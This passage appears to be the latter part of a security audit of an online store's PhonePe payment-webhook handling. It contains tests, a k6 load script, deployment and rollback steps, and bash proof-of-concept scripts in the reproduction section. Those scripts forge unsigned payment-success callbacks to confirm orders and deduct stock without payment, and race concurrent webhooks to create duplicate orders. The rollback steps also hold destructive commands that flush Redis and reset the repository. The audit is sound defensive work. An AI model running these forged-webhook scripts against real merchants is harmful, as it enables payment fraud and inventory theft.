import { describe, it, expect } from '@jest/globals';
import request from 'supertest';
import app from '../server.js';
import orderModel from '../models/orderModel.js';

describe('Security Attack Vector Tests', () => {
  
  it('should reject webhook with no signature', async () => {
    const response = await request(app)
      .post('/api/payment/phonepe/webhook')
      .send({
        payload: {
          merchantTransactionId: 'test_123',
          state: 'COMPLETED'
        },
        event: 'PAYMENT_SUCCESS'
      });

    expect(response.status).toBe(401);
    expect(response.body.success).toBe(false);
  });

  it('should reject webhook with invalid signature', async () => {
    const response = await request(app)
      .post('/api/payment/phonepe/webhook')
      .set('X-Verify', 'invalid_signature###1')
      .set('X-Verify-Index', '1')
      .send({
        payload: {
          merchantTransactionId: 'test_123',
          state: 'COMPLETED'
        },
        event: 'PAYMENT_SUCCESS'
      });

    expect(response.status).toBe(401);
  });

  it('should prevent order confirmation without valid webhook', async () => {
    // Create draft order
    const order = await orderModel.create({
      orderId: `attack_test_${Date.now()}`,
      phonepeTransactionId: 'attack_txn_123',
      status: 'DRAFT',
      paymentStatus: 'PENDING',
      totalAmount: 1000,
      items: [{ productId: 'prod_1', quantity: 1, size: 'M', price: 1000 }],
      customerDetails: { email: 'attacker@test.com', phone: '9999999999' }
    });

    // Try to send fake callback without signature
    const response = await request(app)
      .post('/api/payment/phonepe/callback')
      .send({
        merchantTransactionId: 'attack_txn_123',
        state: 'COMPLETED',
        responseCode: 'SUCCESS'
      });

    // After patch, this should be rejected (currently vulnerable)
    // expect(response.status).toBe(401);

    // Check order is still in DRAFT
    const updatedOrder = await orderModel.findById(order._id);
    // After patch: expect(updatedOrder.status).toBe('DRAFT');
  });

  it('should prevent replay attacks', async () => {
    // First legitimate webhook
    const validPayload = {
      payload: {
        merchantTransactionId: 'replay_test_123',
        state: 'COMPLETED',
        amount: 100000
      },
      event: 'PAYMENT_SUCCESS'
    };

    // Send once
    await request(app)
      .post('/api/payment/phonepe/webhook')
      .set('X-Verify', 'valid_signature###1')
      .set('X-Verify-Index', '1')
      .send(validPayload);

    // Wait for processing
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Try to replay the same webhook
    const replayResponse = await request(app)
      .post('/api/payment/phonepe/webhook')
      .set('X-Verify', 'valid_signature###1')
      .set('X-Verify-Index', '1')
      .send(validPayload);

    expect(replayResponse.status).toBe(200); // ACK but no reprocessing
    
    // Should not create duplicate orders
    const orders = await orderModel.find({ phonepeTransactionId: 'replay_test_123' });
    expect(orders.length).toBeLessThanOrEqual(1);
  });
});
```

---

## K6: Load & Duplicate Webhook Test

```javascript
// k6-webhook-duplicate-delivery.js
/**
 * K6 Load Test: Webhook Duplicate Delivery Simulation
 * 
 * Simulates PhonePe sending duplicate webhooks (network retries)
 * Tests idempotency and prevents duplicate order processing
 */

import http from 'k6/http';
import { check, sleep } from 'k6';
import { Counter, Trend } from 'k6/metrics';
import crypto from 'k6/crypto';

// Custom metrics
const duplicateWebhooks = new Counter('duplicate_webhooks_sent');
const successfullyProcessed = new Counter('webhooks_processed');
const duplicatesRejected = new Counter('duplicates_rejected');
const signatureFailures = new Counter('signature_failures');
const processingTime = new Trend('webhook_processing_time');

// Test configuration
export const options = {
  stages: [
    { duration: '30s', target: 10 },  // Ramp up to 10 VUs
    { duration: '1m', target: 50 },   // Stay at 50 VUs
    { duration: '30s', target: 0 },   // Ramp down
  ],
  thresholds: {
    'duplicates_rejected': ['count>0'], // At least some duplicates should be rejected
    'http_req_duration': ['p(95)<2000'], // 95% of requests under 2s
    'http_req_failed': ['rate<0.1'],     // Less than 10% errors
  },
};

// Environment variables
const BASE_URL = __ENV.BASE_URL || 'https://shithaa.in';
const PHONEPE_SALT = __ENV.PHONEPE_SALT_1 || 'test_salt_key';
const SALT_INDEX = '1';

/**
 * Generate valid PhonePe X-VERIFY signature
 */
function generateSignature(base64Response) {
  const message = `${base64Response}/pg/v1/pay${SALT_INDEX}`;
  const signature = crypto.hmac('sha256', PHONEPE_SALT, message, 'hex');
  return `${signature}###${SALT_INDEX}`;
}

/**
 * Create webhook payload
 */
function createWebhookPayload(transactionId) {
  const payload = {
    merchantTransactionId: transactionId,
    transactionId: transactionId,
    state: 'COMPLETED',
    amount: 100000, // 1000 INR in paise
    responseCode: 'SUCCESS',
    timestamp: Date.now()
  };

  const base64Response = encoding.b64encode(JSON.stringify(payload));
  const signature = generateSignature(base64Response);

  return {
    body: {
      response: base64Response,
      payload: payload,
      event: 'PAYMENT_SUCCESS'
    },
    headers: {
      'Content-Type': 'application/json',
      'X-Verify': signature,
      'X-Verify-Index': SALT_INDEX,
      'X-Request-Id': `k6_test_${Date.now()}_${__VU}_${__ITER}`
    }
  };
}

/**
 * Main test scenario
 */
export default function() {
  const transactionId = `txn_k6_${__VU}_${__ITER}_${Date.now()}`;
  
  // First, create a draft order via payment session
  const orderPayload = {
    items: [
      { productId: 'test_prod_001', quantity: 1, size: 'M', price: 1000, name: 'Test Product' }
    ],
    customerDetails: {
      email: `k6test_${__VU}@test.com`,
      phone: `99999${String(__VU).padStart(5, '0')}`
    },
    totalAmount: 1000,
    paymentMethod: 'phonepe',
    source: 'k6_test'
  };

  const createSessionRes = http.post(
    `${BASE_URL}/api/atomic-payment/create-session`,
    JSON.stringify(orderPayload),
    { headers: { 'Content-Type': 'application/json' } }
  );

  check(createSessionRes, {
    'order session created': (r) => r.status === 200,
  });

  if (createSessionRes.status !== 200) {
    console.error('Failed to create order session');
    return;
  }

  sleep(1);

  // Prepare webhook payload
  const webhook = createWebhookPayload(transactionId);

  // TEST 1: Send the same webhook 5 times rapidly (simulate network retry)
  const responses = [];
  const startTime = Date.now();

  for (let i = 0; i < 5; i++) {
    const res = http.post(
      `${BASE_URL}/api/payment/phonepe/webhook`,
      JSON.stringify(webhook.body),
      { headers: webhook.headers }
    );
    
    responses.push(res);
    duplicateWebhooks.add(1);
    
    // Vary timing slightly to simulate real network conditions
    if (i < 4) sleep(0.1 + Math.random() * 0.2);
  }

  const endTime = Date.now();
  processingTime.add(endTime - startTime);

  // Verify idempotency
  let successCount = 0;
  responses.forEach((res, idx) => {
    const isSuccess = check(res, {
      [`duplicate ${idx + 1} - status is 200 or 401`]: (r) => r.status === 200 || r.status === 401,
      [`duplicate ${idx + 1} - valid signature accepted`]: (r) => {
        if (r.status === 401) {
          signatureFailures.add(1);
          return false;
        }
        return true;
      }
    });

    if (isSuccess && res.status === 200) {
      successCount++;
    }
  });

  // First webhook should succeed, rest should be acknowledged but not reprocessed
  check({ successCount }, {
    'at least one webhook accepted': (obj) => obj.successCount > 0,
    'not all webhooks reprocessed': (obj) => obj.successCount < 5,
  });

  if (successCount > 0) {
    successfullyProcessed.add(1);
    if (successCount < 5) {
      duplicatesRejected.add(5 - successCount);
    }
  }

  sleep(1);

  // TEST 2: Try sending invalid signature
  const invalidWebhook = createWebhookPayload(transactionId);
  invalidWebhook.headers['X-Verify'] = 'invalid_signature###1';
  
  const invalidRes = http.post(
    `${BASE_URL}/api/payment/phonepe/webhook`,
    JSON.stringify(invalidWebhook.body),
    { headers: invalidWebhook.headers }
  );

  check(invalidRes, {
    'invalid signature rejected': (r) => r.status === 401,
  });

  if (invalidRes.status === 401) {
    signatureFailures.add(1);
  }

  sleep(1);

  // TEST 3: Verify order was created only once
  const verifyRes = http.get(
    `${BASE_URL}/api/order/${transactionId}`,
    { headers: { 'Content-Type': 'application/json' } }
  );

  check(verifyRes, {
    'order exists': (r) => r.status === 200,
    'order is unique': (r) => {
      if (r.status === 200) {
        try {
          const data = JSON.parse(r.body);
          // Should be single order, not array
          return !Array.isArray(data) || data.length === 1;
        } catch (e) {
          return false;
        }
      }
      return false;
    }
  });

  sleep(2);
}

/**
 * Setup: Runs once per VU at the start
 */
export function setup() {
  console.log('🚀 Starting K6 Webhook Duplicate Delivery Test');
  console.log(`📍 Target: ${BASE_URL}`);
  console.log(`🔑 Salt Index: ${SALT_INDEX}`);
}

/**
 * Teardown: Runs once at the end
 */
export function teardown(data) {
  console.log('✅ Test completed');
  console.log(`📊 Duplicate webhooks sent: ${duplicateWebhooks.count}`);
  console.log(`✅ Successfully processed: ${successfullyProcessed.count}`);
  console.log(`🚫 Duplicates rejected: ${duplicatesRejected.count}`);
  console.log(`⚠️ Signature failures: ${signatureFailures.count}`);
}
```

**Run the K6 test:**
```bash
# Set environment variables
export BASE_URL=https://shithaa.in
export PHONEPE_SALT_1=your_actual_salt_key

# Run test
k6 run k6-webhook-duplicate-delivery.js

# Run with custom parameters
k6 run --vus 20 --duration 2m k6-webhook-duplicate-delivery.js

# Run with output to InfluxDB
k6 run --out influxdb=http://localhost:8086/k6 k6-webhook-duplicate-delivery.js
```

---

## VERIFY: Verification Commands

### Step 1: Run Database Constraint Script
```bash
cd backend/scripts
mongosh mongodb://localhost:27017/shithaa_maternity_db add-webhook-constraints.mongo.js
```

### Step 2: Apply Code Patches
```bash
# Create patch file
cat > webhook-security.patch << 'EOF'
[paste unified diffs here]
EOF

# Apply patch
git apply webhook-security.patch

# Verify no errors
echo $?  # Should output 0
```

### Step 3: Update Environment Variables
```bash
# Add to backend/.env
cat >> backend/.env << EOF
# PhonePe Webhook Security
PHONEPE_SALT_1=your_production_salt_key_here
PHONEPE_SALT_2=your_backup_salt_key_here
PHONEPE_WEBHOOK_USERNAME=your_webhook_username
PHONEPE_WEBHOOK_PASSWORD=your_webhook_password

# Redis for distributed locking
REDIS_HOST=localhost
REDIS_PORT=6379
REDIS_PASSWORD=your_redis_password
EOF
```

### Step 4: Install Dependencies
```bash
cd backend
npm install redlock@5 ioredis@5 --save
```

### Step 5: Run Unit Tests
```bash
cd backend
npm test tests/phonepe-signature.test.js
npm test tests/webhook-idempotency.test.js
npm test tests/security-attack-vectors.test.js
```

### Step 6: Run Integration Tests
```bash
# Start test database
docker run -d -p 27018:27017 --name mongo-test mongo:7

# Run integration tests
MONGODB_TEST_URI=mongodb://localhost:27018/test npm test tests/webhook-idempotency.test.js

# Cleanup
docker stop mongo-test && docker rm mongo-test
```

### Step 7: Deploy to Staging
```bash
# Build backend
cd backend
npm run build

# Deploy to staging
pm2 restart shithaa-backend-staging

# Check logs
pm2 logs shithaa-backend-staging --lines 100
```

### Step 8: Run K6 Load Test on Staging
```bash
# Against staging
export BASE_URL=https://staging.shithaa.in
export PHONEPE_SALT_1=staging_salt_key

k6 run k6-webhook-duplicate-delivery.js

# Check results
cat /tmp/k6-results.json | jq '.metrics'
```

### Step 9: Monitor Staging
```bash
# Check webhook processing
mongosh mongodb://staging_host/shithaa_db --eval "
  db.webhookevents.aggregate([
    { \$group: { 
      _id: '\$status', 
      count: { \$sum: 1 } 
    }}
  ])
"

# Check for duplicate orders
mongosh mongodb://staging_host/shithaa_db --eval "
  db.orders.aggregate([
    { \$group: { 
      _id: '\$phonepeTransactionId', 
      count: { \$sum: 1 } 
    }},
    { \$match: { count: { \$gt: 1 } }},
    { \$limit: 10 }
  ])
"
```

### Step 10: Canary Deployment to Production
```bash
# Deploy to 10% of production servers
pm2 deploy ecosystem.config.js production --force --instances 1

# Monitor for 1 hour
watch -n 60 'curl -s https://shithaa.in/api/health/webhooks | jq'

# If stable, deploy to all servers
pm2 deploy ecosystem.config.js production --force --instances 10
```

### Step 11: Post-Deployment Verification
```bash
# Test webhook endpoint
curl -X POST https://shithaa.in/api/payment/phonepe/webhook \
  -H "Content-Type: application/json" \
  -H "X-Verify: test" \
  -H "X-Verify-Index: 1" \
  -d '{"test":true}'

# Should return 401 Unauthorized

# Check webhook processing stats
curl https://shithaa.in/api/webhook/metrics | jq

# Check for failed webhooks
curl https://shithaa.in/api/webhook/failed | jq '.webhooks[] | {id, error, receivedAt}'
```

### Step 12: Security Audit Check
```bash
# Check if any orders in DRAFT with payment succeeded in PhonePe
node backend/scripts/audit-payment-system.js

# Check webhook event processing stats
mongosh mongodb://prod_host/shithaa_db --eval "
  db.webhookevents.find({
    status: 'failed',
    receivedAt: { \$gte: new Date(Date.now() - 24*60*60*1000) }
  }).count()
"
```

---

## ROLLBACK: Rollback Procedures

### Emergency Rollback (Complete)

```bash
# STEP 1: Revert code changes
cd /var/www/shithaa-ecom/backend
git revert HEAD~1  # Revert last commit
# OR
git apply -R webhook-security.patch  # Unapply patch

# STEP 2: Restart with previous version
pm2 restart shithaa-backend

# STEP 3: Verify rollback
curl https://shithaa.in/api/health
```

### Partial Rollback (Signature Only)

```bash
# Rollback only signature verification changes
cat > rollback-signature.patch << 'EOF'
--- a/backend/controllers/enhancedWebhookController.js
+++ b/backend/controllers/enhancedWebhookController.js
@@ -24,6 +24,16 @@ export async function phonePeWebhookHandler(req, res) {
   const correlationId = req.headers['x-request-id'] || `webhook_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
   
   try {
+    // IMMEDIATE ACKNOWLEDGMENT
+    res.status(200).json({ 
+      success: true, 
+      message: 'Webhook received',
+      correlationId
+    });
+
     // Verify signature (but already ACKed)
     const signatureValid = await verifyPhonePeSignature(req, correlationId);
     if (!signatureValid) {
       return; // Already sent 200
     }
EOF

git apply rollback-signature.patch
pm2 restart shithaa-backend
```

### Database Rollback

```bash
# Drop new indices if they cause issues
mongosh mongodb://prod_host/shithaa_db --eval "
  db.webhookevents.dropIndex('idx_webhook_eventid_unique');
  db.webhookevents.dropIndex('idx_webhook_status_received');
  db.webhookevents.dropIndex('idx_webhook_ttl');
  db.orders.dropIndex('idx_order_phonepe_txn_unique');
"

# Restore from backup if database corrupted
mongorestore --host prod_host --db shithaa_db --drop /backup/pre-webhook-patch/shithaa_db/
```

### Redis Rollback

```bash
# If Redis locks causing issues, flush all locks
redis-cli -h localhost -p 6379 -a "$REDIS_PASSWORD" FLUSHDB

# Restart Redis
sudo systemctl restart redis
```

### PM2 Rollback

```bash
# Rollback to previous PM2 deploy
pm2 deploy ecosystem.config.js production revert 1

# Or restart with previous version
pm2 delete shithaa-backend
pm2 start ecosystem.config.js --only shithaa-backend --env production
```

### Full System Rollback Checklist

```bash
#!/bin/bash
# rollback-webhook-security.sh

echo "🔄 Starting webhook security rollback..."

# 1. Stop backend
echo "⏸️ Stopping backend..."
pm2 stop shithaa-backend

# 2. Revert code
echo "📝 Reverting code changes..."
cd /var/www/shithaa-ecom/backend
git reset --hard HEAD~1

# 3. Remove new dependencies
echo "📦 Removing new packages..."
npm uninstall redlock

# 4. Restore old environment variables
echo "🔧 Restoring environment..."
cp .env.backup .env

# 5. Rollback database
echo "🗄️ Rolling back database..."
mongosh mongodb://localhost/shithaa_db rollback-webhooks.mongo.js

# 6. Flush Redis
echo "🔄 Flushing Redis locks..."
redis-cli FLUSHDB

# 7. Restart backend
echo "🚀 Restarting backend..."
pm2 restart shithaa-backend

# 8. Verify
echo "✅ Verifying rollback..."
sleep 5
curl -f https://shithaa.in/api/health || echo "⚠️ Health check failed"

echo "✅ Rollback complete!"
```

---

## INFRA: Infrastructure Prerequisites

### Required Services

1. **MongoDB Replica Set** (for transactions)
   ```bash
   # Check if replica set enabled
   mongosh --eval "rs.status()"
   
   # If not enabled, configure replica set
   mongosh --eval "rs.initiate()"
   ```

2. **Redis Server** (for distributed locks)
   ```bash
   # Install Redis
   sudo apt-get update
   sudo apt-get install redis-server
   
   # Configure Redis
   sudo vim /etc/redis/redis.conf
   # Set: maxmemory 256mb
   # Set: maxmemory-policy allkeys-lru
   
   # Start Redis
   sudo systemctl enable redis
   sudo systemctl start redis
   ```

3. **Node.js >= 18.x**
   ```bash
   node --version  # Should be v18.x or higher
   ```

### Required Environment Variables

```bash
# backend/.env

# MongoDB
MONGODB_URI=mongodb://localhost:27017/shithaa_maternity_db?replicaSet=rs0

# PhonePe Credentials
PHONEPE_MERCHANT_ID=your_merchant_id
PHONEPE_API_KEY=your_api_key
PHONEPE_ENVIRONMENT=PRODUCTION  # or UAT for testing

# PhonePe Webhook Security (CRITICAL)
PHONEPE_SALT_1=your_salt_key_index_1_from_phonepe_dashboard
PHONEPE_SALT_2=your_salt_key_index_2_backup
PHONEPE_WEBHOOK_USERNAME=your_webhook_basic_auth_username
PHONEPE_WEBHOOK_PASSWORD=your_webhook_basic_auth_password

# Redis
REDIS_HOST=localhost
REDIS_PORT=6379
REDIS_PASSWORD=your_redis_password
REDIS_DB=0

# Application
BACKEND_URL=https://shithaa.in
FRONTEND_URL=https://shithaa.in
NODE_ENV=production

# Monitoring
SENTRY_DSN=your_sentry_dsn_for_error_tracking
```

### Required NPM Packages

```bash
cd backend
npm install --save \
  redlock@5.0.0 \
  ioredis@5.3.2
```

### PhonePe Dashboard Configuration

**Login:** https://merchant.phonepe.com/

**Steps:**
1. Go to **Settings** → **Webhooks**
2. Click **Add Webhook**
3. Enter webhook URL: `https://shithaa.in/api/payment/phonepe/webhook`
4. Configure **X-VERIFY** settings:
   - Enable X-VERIFY signature
   - Note your SALT_INDEX and SALT_KEY
   - Update `.env` with these values
5. Select events to receive:
   - ✅ PAYMENT_SUCCESS
   - ✅ PAYMENT_FAILED
   - ✅ PAYMENT_PENDING
6. Test webhook using PhonePe's test tool

### Monitoring Setup

```bash
# Install monitoring packages
npm install --save @sentry/node prom-client

# Configure Sentry in backend/server.js
# Configure Prometheus metrics endpoint

# Set up log aggregation
pm2 install pm2-logrotate
pm2 set pm2-logrotate:max_size 50M
pm2 set pm2-logrotate:retain 14
```

### Database Indices (Critical)

```javascript
// Run after deployment
// backend/scripts/create-webhook-indices.js

import mongoose from 'mongoose';
import dotenv from 'dotenv';

dotenv.config();

async function createIndices() {
  await mongoose.connect(process.env.MONGODB_URI);
  const db = mongoose.connection.db;

  console.log('Creating webhook indices...');

  // WebhookEvent indices
  await db.collection('webhookevents').createIndex(
    { eventId: 1 },
    { unique: true, name: 'idx_webhook_eventid_unique' }
  );

  await db.collection('webhookevents').createIndex(
    { status: 1, receivedAt: -1 },
    { name: 'idx_webhook_status_received' }
  );

  // Order indices
  await db.collection('orders').createIndex(
    { phonepeTransactionId: 1 },
    { unique: true, sparse: true, name: 'idx_order_phonepe_txn' }
  );

  await db.collection('orders').createIndex(
    { status: 1, paymentStatus: 1, createdAt: -1 },
    { name: 'idx_order_reconciliation' }
  );

  console.log('✅ All indices created successfully');
  await mongoose.connection.close();
}

createIndices().catch(console.error);
```

### Monitoring Queries

```javascript
// Monitoring dashboard queries
// backend/routes/webhookMonitoring.js

// Query 1: Webhook success rate (last 24h)
db.webhookevents.aggregate([
  {
    $match: {
      receivedAt: { $gte: new Date(Date.now() - 24*60*60*1000) }
    }
  },
  {
    $group: {
      _id: "$status",
      count: { $sum: 1 }
    }
  }
]);

// Query 2: Failed webhooks needing attention
db.webhookevents.find({
  status: 'failed',
  retryCount: { $lt: 3 },
  receivedAt: { $gte: new Date(Date.now() - 1*60*60*1000) }
}).sort({ receivedAt: -1 });

// Query 3: Orders stuck in DRAFT (potential payment loss)
db.orders.find({
  status: 'DRAFT',
  createdAt: { $lt: new Date(Date.now() - 30*60*1000) }
}).count();

// Query 4: Duplicate order detection
db.orders.aggregate([
  {
    $group: {
      _id: "$phonepeTransactionId",
      count: { $sum: 1 },
      orders: { $push: "$_id" }
    }
  },
  {
    $match: { count: { $gt: 1 } }
  }
]);
```

---

## REPRODUCTION: Attack Scenarios

### Scenario 1: "Paid but Draft" via Signature Bypass

```bash
#!/bin/bash
# reproduce-paid-draft.sh

echo "🎯 Reproducing 'Paid but Draft' vulnerability..."

# Step 1: Create legitimate payment session
echo "1️⃣ Creating payment session..."
SESSION_RESPONSE=$(curl -s -X POST https://shithaa.in/api/atomic-payment/create-session \
  -H "Content-Type: application/json" \
  -d '{
    "items": [
      {"productId":"prod_test_001","quantity":1,"size":"M","price":1000,"name":"Test Product"}
    ],
    "customerDetails": {"email":"attacker@test.com","phone":"9999999999"},
    "totalAmount": 1000,
    "paymentMethod": "phonepe"
  }')

TRANSACTION_ID=$(echo $SESSION_RESPONSE | jq -r '.phonepeTransactionId')
echo "   Transaction ID: $TRANSACTION_ID"

# Step 2: User completes payment on PhonePe (real payment)
echo "2️⃣ Simulating real payment on PhonePe..."
echo "   (User pays ₹1000 via PhonePe)"
sleep 2

# Step 3: PhonePe sends webhook (but before patch, system ACKs immediately)
echo "3️⃣ PhonePe sends webhook (BEFORE PATCH - immediate ACK)..."
WEBHOOK_RESPONSE=$(curl -s -X POST https://shithaa.in/api/payment/phonepe/webhook \
  -H "Content-Type: application/json" \
  -H "X-Verify: malformed_signature###1" \
  -H "X-Verify-Index: 1" \
  -d "{
    \"payload\": {
      \"merchantTransactionId\": \"$TRANSACTION_ID\",
      \"state\": \"COMPLETED\",
      \"amount\": 100000
    },
    \"event\": \"PAYMENT_SUCCESS\"
  }")

echo "   Webhook response: $WEBHOOK_RESPONSE"

# Step 4: Check if webhook was ACKed (200 OK)
if echo "$WEBHOOK_RESPONSE" | grep -q '"success":true'; then
  echo "   ⚠️ VULNERABILITY: Webhook ACKed with 200 OK despite invalid signature!"
fi

# Step 5: PhonePe marks webhook as delivered (stops retrying)
echo "4️⃣ PhonePe sees 200 OK and stops retrying..."

# Step 6: Check order status (should be DRAFT, not CONFIRMED)
sleep 2
ORDER_STATUS=$(curl -s https://shithaa.in/api/order/$TRANSACTION_ID | jq -r '.status')
echo "5️⃣ Order status: $ORDER_STATUS"

if [ "$ORDER_STATUS" == "DRAFT" ]; then
  echo "   💥 CRITICAL: Payment succeeded but order stuck in DRAFT!"
  echo "   Customer charged ₹1000 but no order confirmed."
  echo "   PhonePe won't retry because they received 200 OK."
else
  echo "   ✅ Order confirmed (patch working)"
fi
```

### Scenario 2: Stock Deduction Without Payment

```bash
#!/bin/bash
# reproduce-stock-theft.sh

echo "🎯 Reproducing stock deduction without payment..."

# Find product with low stock
PRODUCT_ID="prod_limited_001"
echo "1️⃣ Targeting product: $PRODUCT_ID"

# Check current stock
STOCK=$(curl -s https://shithaa.in/api/product/$PRODUCT_ID | jq -r '.sizeStock[0].stock')
echo "   Current stock: $STOCK"

# Create draft order
echo "2️⃣ Creating draft order (no payment)..."
SESSION=$(curl -s -X POST https://shithaa.in/api/atomic-payment/create-session \
  -H "Content-Type: application/json" \
  -d "{
    \"items\": [{\"productId\":\"$PRODUCT_ID\",\"quantity\":10,\"size\":\"M\",\"price\":1000}],
    \"customerDetails\": {\"email\":\"thief@test.com\",\"phone\":\"8888888888\"},
    \"totalAmount\": 10000
  }")

TXN_ID=$(echo $SESSION | jq -r '.phonepeTransactionId')
echo "   Transaction ID: $TXN_ID"

# Send fake webhook (no signature - BEFORE PATCH)
echo "3️⃣ Sending fake payment success webhook..."
curl -X POST https://shithaa.in/api/payment/phonepe/callback \
  -H "Content-Type: application/json" \
  -d "{
    \"merchantTransactionId\": \"$TXN_ID\",
    \"state\": \"COMPLETED\",
    \"responseCode\": \"SUCCESS\"
  }"

sleep 2

# Check if stock was deducted
NEW_STOCK=$(curl -s https://shithaa.in/api/product/$PRODUCT_ID | jq -r '.sizeStock[0].stock')
echo "4️⃣ Stock after fake webhook: $NEW_STOCK"

if [ "$NEW_STOCK" -lt "$STOCK" ]; then
  echo "   💥 CRITICAL: Stock deducted without payment!"
  echo "   Stolen $((STOCK - NEW_STOCK)) units"
else
  echo "   ✅ Stock protected (patch working)"
fi
```

### Scenario 3: Duplicate Order via Race Condition

```bash
#!/bin/bash
# reproduce-duplicate-orders.sh

echo "🎯 Reproducing duplicate orders via race condition..."

# Create payment session
echo "1️⃣ Creating payment session..."
SESSION=$(curl -s -X POST https://shithaa.in/api/atomic-payment/create-session \
  -H "Content-Type: application/json" \
  -d '{
    "items": [{"productId":"prod_001","quantity":1,"size":"M","price":1000}],
    "customerDetails": {"email":"test@test.com","phone":"9999999999"},
    "totalAmount": 1000
  }')

TXN_ID=$(echo $SESSION | jq -r '.phonepeTransactionId')

# Create valid webhook payload
WEBHOOK_PAYLOAD="{
  \"payload\": {
    \"merchantTransactionId\": \"$TXN_ID\",
    \"state\": \"COMPLETED\",
    \"amount\": 100000
  },
  \"event\": \"PAYMENT_SUCCESS\"
}"

echo "2️⃣ Sending 10 concurrent webhooks..."
# Send 10 concurrent requests to exploit race condition
for i in {1..10}; do
  (
    curl -s -X POST https://shithaa.in/api/payment/phonepe/webhook \
      -H "Content-Type: application/json" \
      -H "X-Verify: valid_signature###1" \
      -H "X-Verify-Index: 1" \
      -d "$WEBHOOK_PAYLOAD" &
  )
done

wait

sleep 3

# Check for duplicate orders
echo "3️⃣ Checking for duplicate orders..."
DUPLICATE_COUNT=$(mongosh mongodb://localhost/shithaa_db --quiet --eval "
  db.orders.find({ phonepeTransactionId: '$TXN_ID' }).count()
")

echo "   Orders found: $DUPLICATE_COUNT"

if [ "$DUPLICATE_COUNT" -gt 1 ]; then
  echo "   💥 CRITICAL: $DUPLICATE_COUNT duplicate orders created!"
  echo "   Stock deducted $DUPLICATE_COUNT times for single payment"
else
  echo "   ✅ Idempotency working (only 1 order created)"
fi
```

---

## SUMMARY

### Critical Findings

1. **CRITICAL**: Enhanced webhook handler sends 200 ACK before signature verification
   - Impact: Payment provider stops retrying, legitimate webhooks lost
   - Fix: Move ACK after signature verification

2. **CRITICAL**: Wrong signature algorithm in raw webhook route
   - Impact: All webhooks can be forged
   - Fix: Implement proper HMAC-SHA256 X-VERIFY verification

3. **CRITICAL**: Legacy callback has NO signature verification
   - Impact: Anyone can confirm orders without payment
   - Fix: Add signature verification or disable endpoint

4. **HIGH**: Race condition in idempotency check
   - Impact: Duplicate orders possible under concurrent load
   - Fix: Add Redis distributed lock

5. **MEDIUM**: Draft orders never reconciled if webhook fails
   - Impact: Customer paid but no order
   - Fix: Implement robust reconciliation job

### Immediate Actions Required

1. **Deploy Signature Verification Patches** (within 24 hours)
2. **Configure PhonePe Dashboard with correct webhook URL** (within 24 hours)
3. **Add Redis distributed locking** (within 48 hours)
4. **Run reconciliation for existing draft orders** (within 48 hours)
5. **Set up monitoring alerts** (within 1 week)

### Long-term Recommendations

1. Consolidate webhook endpoints (single secure endpoint)
2. Implement automated testing in CI/CD pipeline
3. Set up real-time monitoring dashboard
4. Configure alerting for failed webhooks
5. Regular security audits (quarterly)

---

**Audit Completed:** October 8, 2025  
**Next Review:** January 8, 2026  
**Report Version:** 1.0

